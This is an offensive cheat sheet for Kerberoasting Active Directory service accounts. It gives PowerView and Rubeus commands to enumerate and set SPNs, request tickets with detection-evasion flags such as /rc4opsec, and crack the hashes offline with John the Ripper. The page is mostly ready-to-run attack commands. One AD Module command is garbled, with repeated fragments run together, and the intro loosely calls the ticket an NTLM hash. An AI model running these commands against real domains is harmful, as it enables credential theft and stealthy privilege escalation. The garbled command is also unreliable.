# Kerberoast

In a Kerberoast attack, the attacker requests a Kerberos session ticket (TGS)  to retrieve the service account's NTLM hash, which is partially encrypted with the service account's hash. \
This hash is then cracked offline to extract the service account's password.\


## SPNs

### Find SPNs

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -SPN
```
{% endtab %}

{% tab title="AD Module" %}
```powershell
Get-ADUser -Filter {Servicer -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalNameGet-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalNameGet-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```
{% endtab %}
{% endtabs %}

## Set SPNs

With enough rights (GenericAll/GenericWrite), a target user's SPN can be set

{% tabs %}
{% tab title="PowerView" %}
```powershell
# Find Permissions - for example RDPUsers group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Set SPN
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

```
{% endtab %}
{% endtabs %}

## TGS

```powershell
# try to downgrade to RC4-HMAC and get hashes
Rubeus.exe kerberoast 

# to avoid detections look for Kerberoastable accounts that only support RC4_HMAC
Rubeus.exe kerberoast /rc4opsec

# Specific SPN - more stealth
Rubeus.exe kerberoast /user:svcadmin  /rc4opsec

# usefull flags
/outfile:hashes.txt # output the hashes into file
/simple # hashes are output in the console one per line
/nowrap # results will not be line wrapped
/stats # will output statistics about kerberoastable users found
```

## Crack

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10kworst-pass.txt C:\AD\Tools\hashes.txt
```

